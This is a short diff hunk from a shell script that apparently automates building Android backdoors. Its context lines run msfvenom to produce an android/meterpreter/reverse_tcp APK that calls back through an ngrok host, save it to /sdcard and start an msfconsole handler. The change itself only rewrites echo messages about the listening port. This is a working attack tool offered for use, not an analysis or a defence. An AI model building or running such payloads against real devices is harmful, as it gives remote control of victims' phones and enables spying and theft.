@@ -13,7 +13,8 @@ read -p '>> ' APK
 msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$LPORT R >/sdcard/$APK.apk
 msfconsole -r auto.rc
 else
-echo 'you must add your LPORT from ngrok'
+echo 'you must 'Ctrl-C' and add this command'
+echo 'set LPORT <your ngrok port> ' lolcat
 msfconsole -r auto.rc
 fi
 else
